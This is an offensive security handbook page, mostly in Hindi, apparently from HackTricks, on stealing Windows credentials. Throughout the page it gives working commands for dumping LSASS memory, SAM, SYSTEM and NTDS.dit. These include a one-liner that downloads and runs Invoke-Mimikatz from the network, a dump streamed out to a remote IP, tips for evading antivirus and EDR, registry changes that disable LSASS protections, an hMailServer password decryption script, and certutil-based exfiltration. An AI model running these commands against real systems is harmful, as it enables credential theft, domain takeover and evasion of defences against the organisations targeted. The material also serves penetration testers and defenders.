# Windows Credentials चुराना

{{#include ../../banners/hacktricks-training.md}}

## Credentials Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Mimikatz और क्या कर सकता है यह देखने के लिए** [**this page**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Learn about some possible credentials protections here.**](credentials-protections.md) **ये सुरक्षा उपाय Mimikatz को कुछ credentials निकालने से रोक सकते हैं।**

## Credentials with Meterpreter

इस्तेमाल करें [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **जो** मैंने बनाया है, ताकि victim के अंदर **passwords और hashes खोजे जा सकें**।
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## AV को बायपास करना

### Procdump + Mimikatz

चूँकि **Procdump from** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**एक वैध Microsoft टूल है**, इसलिए इसे Defender द्वारा पता नहीं लगाया जाता।\
आप इस टूल का उपयोग करके **dump the lsass process**, **download the dump** और dump से **extract** करके **credentials locally** प्राप्त कर सकते हैं।

आप [SharpDump](https://github.com/GhostPack/SharpDump) का भी उपयोग कर सकते हैं।
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
यह प्रक्रिया स्वचालित रूप से [SprayKatz](https://github.com/aas-n/spraykatz) के साथ की जाती है: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**नोट**: कुछ **AV** **procdump.exe to dump lsass.exe** के उपयोग को **malicious** के रूप में **detect** कर सकते हैं, क्योंकि वे **"procdump.exe" and "lsass.exe"** स्ट्रिंग्स को पहचान रहे होते हैं। इसलिए **lsass.exe** के नाम की बजाय lsass.exe का **PID** **argument** के रूप में **procdump** को **pass** करना अधिक **stealthier** होता है।

### lsass को **comsvcs.dll** के साथ डंप करना

`C:\Windows\System32` में पाई जाने वाली **comsvcs.dll** नामक एक DLL क्रैश की स्थिति में **dumping process memory** के लिए जिम्मेदार है। यह DLL **`MiniDumpW`** नामक एक **function** शामिल करती है, जिसे `rundll32.exe` के माध्यम से invoke करने के लिए डिज़ाइन किया गया है।\
पहले दो arguments का उपयोग अप्रासंगिक है, लेकिन तीसरा argument तीन घटकों में विभाजित होता है। डंप किए जाने वाले process का ID पहला घटक है, डंप फ़ाइल का स्थान दूसरा घटक है, और तीसरा घटक सख्ती से शब्द **full** ही होना चाहिए। कोई वैकल्पिक विकल्प मौजूद नहीं है।\
इन तीनों घटकों को पार्स करने पर, DLL डंप फ़ाइल बनाती है और निर्दिष्ट process की मेमोरी को इस फ़ाइल में स्थानांतरित कर देती है।\
**comsvcs.dll** का उपयोग lsass प्रोसेस को डंप करने के लिए संभव है, जिससे procdump को अपलोड और execute करने की आवश्यकता समाप्त हो जाती है। इस विधि का विवरण [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords/) पर दिया गया है।

निम्नलिखित कमांड निष्पादन के लिए उपयोग की जाती है:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**आप इस प्रक्रिया को स्वचालित कर सकते हैं** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Dumping lsass with Task Manager**

1. Task Bar पर राइट-क्लिक करें और Task Manager पर क्लिक करें
2. More details पर क्लिक करें
3. Processes tab में "Local Security Authority Process" process खोजें
4. "Local Security Authority Process" process पर राइट-क्लिक करें और "Create dump file" पर क्लिक करें।

### Dumping lsass with procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) Microsoft द्वारा साइन किया गया एक बाइनरी है जो [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) सूट का हिस्सा है।
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## PPLBlade के साथ lsass को डंप करना

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) एक Protected Process Dumper Tool है जो memory dump को obfuscate करने और इसे disk पर drop किए बिना remote workstations पर transfer करने का समर्थन करता है।

**मुख्य कार्यक्षमताएँ**:

1. PPL protection को बायपास करना
2. Defender के signature-based detection mechanisms से बचने के लिए memory dump फ़ाइलों को obfuscate करना
3. RAW और SMB upload methods के साथ memory dump को disk पर drop किए बिना upload करना (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – SSP-आधारित LSASS dumping without MiniDumpWriteDump

Ink Dragon तीन-स्टेज dumper भेजता है जिसे **LalsDumper** कहा जाता है जो कभी `MiniDumpWriteDump` को कॉल नहीं करता, इसलिए उस API पर EDR hooks कभी ट्रिगर नहीं होते:

1. **Stage 1 loader (`lals.exe`)** – `fdp.dll` में 32 lower-case `d` characters वाले placeholder की खोज करता है, इसे `rtu.txt` के absolute path से ओवरराइट कर देता है, patched DLL को `nfdp.dll` के रूप में सेव करता है, और `AddSecurityPackageA("nfdp","fdp")` को कॉल करता है। यह **LSASS** को नए Security Support Provider (SSP) के रूप में malicious DLL लोड करने के लिए मजबूर करता है।
2. **Stage 2 inside LSASS** – जब LSASS `nfdp.dll` लोड करता है, DLL `rtu.txt` पढ़ता है, प्रत्येक बाइट को `0x20` से XOR करता है, और decoded blob को memory में map करता है execution ट्रांसफर करने से पहले।
3. **Stage 3 dumper** – mapped payload MiniDump logic को re-implement करता है using **direct syscalls** जो hashed API names से resolve होते हैं (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). A dedicated export named `Tom` `%TEMP%\<pid>.ddt` खोलता है, compressed LSASS dump को फाइल में stream करता है, और handle बंद कर देता है ताकि बाद में exfiltration हो सके।

Operator notes:

* `lals.exe`, `fdp.dll`, `nfdp.dll`, और `rtu.txt` को एक ही डायरेक्टरी में रखें। Stage 1 hard-coded placeholder को `rtu.txt` के absolute path से rewrite करता है, इसलिए इन्हें अलग करने से chain टूट जाती है।
* Registration `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` में `nfdp` append करके होती है। आप वह value खुद seed कर सकते हैं ताकि LSASS हर boot पर SSP reload करे।
* `%TEMP%\*.ddt` files compressed dumps हैं। उन्हें स्थानीय रूप से decompress करें, फिर credential extraction के लिए Mimikatz/Volatility को दें।
* `lals.exe` चलाने के लिए admin/SeTcb rights चाहिए ताकि `AddSecurityPackageA` सफल हो; एक बार call वापस आ जाने के बाद, LSASS transparently rogue SSP को लोड कर लेता है और Stage 2 execute होता है।
* Disk से DLL हटाने से वह LSASS से evict नहीं होता। या तो registry entry को delete करें और LSASS restart (reboot) करें या लंबे समय के persistence के लिए वहीं छोड़ दें।

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### LSA secrets निकालें
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### लक्षित DC से NTDS.dit को Dump करें
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### लक्ष्य DC से NTDS.dit का पासवर्ड इतिहास Dump करें
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### प्रत्येक NTDS.dit खाते के लिए pwdLastSet attribute दिखाएँ
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## SAM & SYSTEM चुराना

ये फ़ाइलें _C:\windows\system32\config\SAM_ और _C:\windows\system32\config\SYSTEM_ में **स्थित** होनी चाहिए। लेकिन **आप उन्हें सामान्य तरीके से सिर्फ़ कॉपी नहीं कर सकते** क्योंकि वे सुरक्षित हैं।

### Registry से

इन फाइलों को चुराने का सबसे आसान तरीका Registry से एक कॉपी प्राप्त करना है:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**डाउनलोड करें** उन फाइलों को अपनी Kali मशीन पर और फिर निम्न का उपयोग करके **hashes निकालें**:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

आप इस सेवा का उपयोग करके संरक्षित फाइलों की प्रतिलिपि कर सकते हैं। आपको Administrator होना चाहिए।

#### Using vssadmin

vssadmin बाइनरी केवल Windows Server संस्करणों में उपलब्ध है
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
लेकिन आप यही **Powershell** से भी कर सकते हैं। यह एक उदाहरण है **SAM फ़ाइल को कैसे कॉपी करें** (उपयोग की गई हार्ड ड्राइव "C:" है और इसे C:\users\Public में सहेजा गया है) लेकिन आप इसका उपयोग किसी भी संरक्षित फ़ाइल को कॉपी करने के लिए कर सकते हैं:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
पुस्तक से कोड: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

अंत में, आप [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) का उपयोग करके SAM, SYSTEM और ntds.dit की कॉपी भी बना सकते हैं।
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory प्रमाण-पत्र - NTDS.dit**

The **NTDS.dit** file is known as the heart of **Active Directory**, holding crucial data about user objects, groups, and their memberships. It's where the **password hashes** for domain users are stored. This file is an **Extensible Storage Engine (ESE)** database and resides at **_%SystemRoom%/NTDS/ntds.dit_**.

Within this database, three primary tables are maintained:

- **Data Table**: यह टेबल users और groups जैसे ऑब्जेक्ट्स के विवरण संग्रहीत करने के लिए जिम्मेदार है।
- **Link Table**: यह रिश्तों को ट्रैक करती है, जैसे कि group memberships।
- **SD Table**: यहाँ प्रत्येक ऑब्जेक्ट के लिए **Security descriptors** रखे जाते हैं, जो संग्रहित ऑब्जेक्ट्स की सुरक्षा और access control सुनिश्चित करते हैं।

More information about this: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows uses _Ntdsa.dll_ to interact with that file and its used by _lsass.exe_. Then, **part** of the **NTDS.dit** file could be located **inside the `lsass`** memory (you can find the latest accessed data probably because of the performance improve by using a **cache**).

#### NTDS.dit के अंदर hashes को डिक्रिप्ट करना

हैश तीन बार एन्क्रिप्ट/साइफर किया गया है:

1. Password Encryption Key (**PEK**) को **BOOTKEY** और **RC4** का उपयोग करके डिक्रिप्ट करें।
2. **PEK** और **RC4** का उपयोग करके हैश को डिक्रिप्ट करें।
3. **DES** का उपयोग करके हैश को डिक्रिप्ट करें।

**PEK** का मान हर **domain controller** में समान होता है, लेकिन इसे **NTDS.dit** फ़ाइल के अंदर उस domain controller की **SYSTEM** फाइल के **BOOTKEY** का उपयोग करके साइफर किया जाता है (यह domain controllers के बीच अलग होता है)। इसलिए NTDS.dit फ़ाइल से **credentials** प्राप्त करने के लिए आपको फ़ाइलें **NTDS.dit** और **SYSTEM** चाहिए (_C:\Windows\System32\config\SYSTEM_)।

### Ntdsutil का उपयोग करके NTDS.dit को कॉपी करना

Available since Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
You could also use the [**volume shadow copy**](#stealing-sam-and-system) तरकीब का उपयोग करके **ntds.dit** फ़ाइल की एक कॉपी बना सकते हैं। ध्यान रखें कि आपको **SYSTEM** फ़ाइल की भी एक कॉपी चाहिए होगी (फिर से, [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) तरकीब)।

### **NTDS.dit से हैश निकालना**

एक बार जब आपके पास **NTDS.dit** और **SYSTEM** फ़ाइलें मौजूद हों, तो आप _secretsdump.py_ जैसे tools का उपयोग करके हैश निकाल सकते हैं:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
आप एक वैध डोमेन एडमिन उपयोगकर्ता का उपयोग करके उन्हें **स्वचालित रूप से निकाल सकते हैं**:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
बड़ी **NTDS.dit फ़ाइलों** के लिए इसे निकालने के लिए [gosecretsdump](https://github.com/c-sto/gosecretsdump) का उपयोग करने की सिफारिश की जाती है।

अंत में, आप **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ या **mimikatz** `lsadump::lsa /inject` का भी उपयोग कर सकते हैं।

### **NTDS.dit से डोमेन ऑब्जेक्ट्स को SQLite डेटाबेस में निकालना**

NTDS ऑब्जेक्ट्स को [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) के साथ एक SQLite डेटाबेस में निकाला जा सकता है। न केवल गुप्त जानकारी निकाली जाती है, बल्कि पूरे ऑब्जेक्ट्स और उनके एट्रिब्यूट्स भी निकाले जाते हैं, ताकि जब कच्ची NTDS.dit फ़ाइल पहले से प्राप्त हो तो आगे जानकारी निकालना संभव हो।
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
The `SYSTEM` hive वैकल्पिक है लेकिन secrets को decrypt करने की अनुमति देता है (NT & LM hashes, supplemental credentials जैसे cleartext passwords, kerberos या trust keys, NT & LM password histories)। Along with other information, निम्न डेटा निकाला जाता है : user और machine accounts उनके hashes के साथ, UAC flags, timestamp for last logon and password change, accounts description, names, UPN, SPN, groups और recursive memberships, organizational units tree और membership, trusted domains with trusts type, direction and attributes...

## Lazagne

Download the binary from [here](https://github.com/AlessandroZ/LaZagne/releases). आप इस binary का उपयोग several software से credentials extract करने के लिए कर सकते हैं।
```
lazagne.exe all
```
## SAM और LSASS से credentials निकालने के अन्य टूल

### Windows credentials Editor (WCE)

यह टूल मेमोरी से credentials निकालने के लिए इस्तेमाल किया जा सकता है। डाउनलोड करें: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

SAM file से credentials निकालें
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

SAM फ़ाइल से क्रेडेंशियल निकालें
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

इसे डाउनलोड करें: [ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) और बस **चलाएँ** और पासवर्ड एक्सट्रैक्ट हो जाएंगे।

## Idle RDP सत्रों का माइनिंग और सुरक्षा नियंत्रणों को कमजोर करना

Ink Dragon’s FinalDraft RAT में `DumpRDPHistory` tasker शामिल है, जिसकी तकनीकें किसी भी red-teamer के लिए उपयोगी हैं:

### DumpRDPHistory-style टेलीमेट्री संग्रह

* **Outbound RDP targets** – प्रत्येक user hive को `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*` पर पार्स करें। प्रत्येक subkey में server name, `UsernameHint`, और last write timestamp स्टोर होते हैं। आप PowerShell के साथ FinalDraft की लॉजिक को replicate कर सकते हैं:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Inbound RDP evidence** – Event IDs **21** (successful logon) और **25** (disconnect) के लिए `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` लॉग को query करें ताकि पता चल सके कि किसने मशीन का प्रशासन किया:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

जब आप जान लें कि कौन सा Domain Admin नियमित रूप से कनेक्ट करता है, तो उनकी **disconnected** सत्र मौजूद रहते हुए LSASS dump कर लें (LalsDumper/Mimikatz के साथ)। CredSSP + NTLM fallback उनके verifier और tokens को LSASS में छोड़ देता है, जिन्हें SMB/WinRM के माध्यम से replay करके `NTDS.dit` हासिल किया जा सकता है या domain controllers पर persistence stage किया जा सकता है।

### FinalDraft द्वारा लक्षित रजिस्ट्री डाउनग्रेड

उसी implant कई registry keys के साथ छेड़छाड़ भी करता है ताकि credential theft आसान हो सके:
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* Setting `DisableRestrictedAdmin=1` RDP के दौरान full credential/ticket reuse को सक्षम करता है, जिससे pass-the-hash style pivots संभव होते हैं।
* `LocalAccountTokenFilterPolicy=1` UAC token filtering को disable करता है ताकि local admins को नेटवर्क पर unrestricted tokens मिलें।
* `DSRMAdminLogonBehavior=2` DSRM administrator को DC ऑनलाइन होने पर log on करने देता है, जिससे attackers को एक और built-in high-privilege account मिल जाता है।
* `RunAsPPL=0` LSASS PPL protections को हटाता है, जिससे memory access dumpers जैसे LalsDumper के लिए trivial हो जाता है।

## hMailServer database credentials (post-compromise)

hMailServer अपने DB password को `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` में `[Database] Password=` के तहत स्टोर करता है। यह मान Blowfish-encrypted है static key `THIS_KEY_IS_NOT_SECRET` के साथ और 4-byte word endianness swaps होते हैं। INI से hex string का उपयोग इस Python snippet के साथ करें:
```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```
clear-text password के साथ, file locks से बचने के लिए SQL CE database को कॉपी करें, 32-bit provider लोड करें, और hashes क्वेरी करने से पहले आवश्यक होने पर upgrade करें:
```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```
The `accountpassword` column uses the hMailServer hash format (hashcat mode `1421`). Cracking these values can provide reusable credentials for WinRM/SSH pivots.

## LSA Logon Callback Interception (LsaApLogonUserEx2)

Some tooling captures **plaintext logon passwords** by intercepting the LSA logon callback `LsaApLogonUserEx2`. The idea is to hook or wrap the authentication package callback so credentials are captured **during logon** (before hashing), then written to disk or returned to the operator. This is commonly implemented as a helper that injects into or registers with LSA, and then records each successful interactive/network logon event with the username, domain and password.

ऑपरेशनल नोट्स:
- helper को authentication path में load करने के लिए local admin/SYSTEM की आवश्यकता होती है।
- Captured credentials केवल तभी दिखाई देते हैं जब logon होता है (hook के आधार पर interactive, RDP, service, या network logon)।

## SSMS Saved Connection Credentials (sqlstudio.bin)

SQL Server Management Studio (SSMS) per-user `sqlstudio.bin` फ़ाइल में saved connection information स्टोर करता है। Dedicated dumpers उस फ़ाइल को parse करके saved SQL credentials recover कर सकते हैं। केवल command output लौटाने वाले shells में, फ़ाइल अक्सर Base64 में encode करके stdout पर print कर के exfiltrated की जाती है।
```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```
ऑपरेटर पक्ष पर, फ़ाइल को पुनर्निर्मित करें और credentials पुनर्प्राप्त करने के लिए dumper स्थानीय रूप से चलाएँ:
```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```
## संदर्भ

- [Unit 42 – An Investigation Into Years of Undetected Operations Targeting High-Value Sectors](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
